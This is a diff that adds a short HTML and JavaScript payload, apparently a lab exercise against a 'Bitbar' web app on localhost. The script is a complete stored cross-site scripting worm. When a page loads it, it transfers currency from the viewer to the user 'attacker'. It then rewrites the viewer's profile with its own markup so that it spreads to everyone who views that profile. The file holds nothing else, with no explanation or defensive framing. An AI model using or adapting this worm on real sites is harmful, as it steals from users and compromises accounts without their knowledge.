@@ -1,0 +1,19 @@
+<span id='bitbar_count' class='10'></span>
+<script>
+    var transfer_req = new XMLHttpRequest();
+    transfer_req.onload = function() {
+        var profile_node = document.getElementById("profile");
+        var set_profile_req = new XMLHttpRequest();
+        set_profile_req.open("POST", "http://localhost:3000/set_profile");
+        set_profile_req.setRequestHeader("Content-Type", "application/json");
+        set_profile_req.send(JSON.stringify({
+            "new_profile": profile_node.innerHTML
+        }));
+    }
+    transfer_req.open('POST', 'http://localhost:3000/post_transfer');
+    transfer_req.setRequestHeader("Content-Type", "application/json");
+    transfer_req.send(JSON.stringify({
+        "destination_username":"attacker",
+        "quantity":"1" 
+    }));
+</script>
